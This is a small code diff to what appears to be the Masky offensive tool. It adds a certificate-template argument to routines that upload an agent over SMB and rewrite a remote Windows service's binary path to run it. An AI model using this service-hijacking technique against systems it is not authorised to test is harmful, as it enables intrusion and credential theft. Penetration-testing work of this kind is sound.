@@ -66,7 +66,7 @@ class Smb:
             f"The Masky agent errors will be stored in: {self.__errors_remote_path}"
         )
 
-    def exec_masky(self, target, ca):
+    def exec_masky(self, target, ca, template):
         try:
             self.__upload_masky(target)
             logger.debug(
@@ -87,7 +87,7 @@ class Smb:
         try:
             self.__init_rpc(target)
             self.__init_scmr()
-            self.__edit_svc(ca)
+            self.__edit_svc(ca, template)
             logger.debug(f"The service '{self.__svc_name}' was successfuly modified")
         except Exception as e:
             logger.error(f"Fail to edit the '{self.__svc_name}' service via DCERPC")
@@ -257,7 +257,7 @@ class Smb:
         resp = scmr.hROpenServiceW(self.__scmr_con, self.__svc_handle, self.__svc_name)
         self.__service = resp["lpServiceHandle"]
 
-    def __edit_svc(self, ca):
+    def __edit_svc(self, ca, template):
         resp = scmr.hRQueryServiceConfigW(self.__scmr_con, self.__service)
         self.__initial_binary_path = resp["lpServiceConfig"]["lpBinaryPathName"]
         self.__initial_start_type = resp["lpServiceConfig"]["dwStartType"]
@@ -271,7 +271,7 @@ class Smb:
             scmr.SERVICE_NO_CHANGE,
             scmr.SERVICE_DEMAND_START,
             scmr.SERVICE_ERROR_IGNORE,
-            f'{self.__masky_remote_path} "{ca}" "{self.__output_filename}" "{self.__error_filename}"',
+            f'{self.__masky_remote_path} "{ca}" "{template}" "{self.__output_filename}" "{self.__error_filename}"',
             NULL,
             NULL,
             NULL,
